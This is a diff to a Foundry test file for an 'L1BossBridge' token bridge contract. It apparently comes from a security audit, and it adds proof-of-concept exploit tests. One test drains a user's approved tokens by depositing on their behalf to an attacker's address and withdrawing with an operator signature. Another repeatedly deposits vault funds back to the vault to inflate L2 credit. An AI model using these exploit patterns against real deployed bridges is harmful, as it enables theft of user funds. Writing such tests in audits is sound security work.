@@ -27,7 +27,7 @@ contract L1BossBridgeTest is Test {
 
         // Deploy token and transfer the user some initial balance
         token = new L1Token();
-        token.transfer(address(user), 1000e18);
+        // token.transfer(address(user), 100e18);
 
         // Deploy bridge
         tokenBridge = new L1BossBridge(IERC20(token));
@@ -198,6 +198,57 @@ contract L1BossBridgeTest is Test {
 
         vm.expectRevert(Pausable.EnforcedPause.selector);
         tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
+    }
+
+    //@audit-info highlights to high exploits in `depositToL2` and `sendTol1` func in bridge
+    function testStealingFundsCuzOfArbDeposit() public {
+        Account memory attacker = makeAccount("attacker");
+        vm.startPrank(tokenBridge.owner());
+        token.transfer(user, 100 ether);
+        vm.stopPrank();
+
+        vm.startPrank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+        uint256 userB = token.balanceOf(user);
+        vm.stopPrank();
+
+        vm.startPrank(attacker.addr);
+        tokenBridge.depositTokensToL2(user, attacker.addr, userB);
+        vm.stopPrank();
+
+        bytes memory withdrawalMsg = _getTokenWithdrawalMessage(attacker.addr, userB);
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(withdrawalMsg, operator.key);
+        tokenBridge.withdrawTokensToL1(attacker.addr, userB, v, r, s);
+
+        assertEq(token.balanceOf(attacker.addr), userB);
+    }
+
+    //infinite minting of L1 tokens
+    function testCanTransferVaultToVault() public {
+        address attacker = makeAddr("attacker");
+        console2.log(token.totalSupply());
+        deal(address(token), address(vault), 100 ether);
+
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, 100 ether);
+        tokenBridge.depositTokensToL2(address(vault), attacker, token.balanceOf(address(vault)));
+
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, 100 ether);
+        console2.log(token.balanceOf(address(vault)));
+        tokenBridge.depositTokensToL2(address(vault), attacker, token.balanceOf(address(vault)));
+
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, 100 ether);
+        tokenBridge.depositTokensToL2(address(vault), attacker, token.balanceOf(address(vault)));
+
+        console2.log(token.totalSupply());
+
+        // bytes memory withdrawalMsg = _getTokenWithdrawalMessage(attacker, 300 ether);
+        // (uint8 v, bytes32 r, bytes32 s) = _signMessage(withdrawalMsg, operator.key);
+        // tokenBridge.withdrawTokensToL1(attacker, 300 ether, v, r, s);
+
+        // assertEq(token.balanceOf(attacker), 300 ether);
     }
 
     function _getTokenWithdrawalMessage(address recipient, uint256 amount) private view returns (bytes memory) {
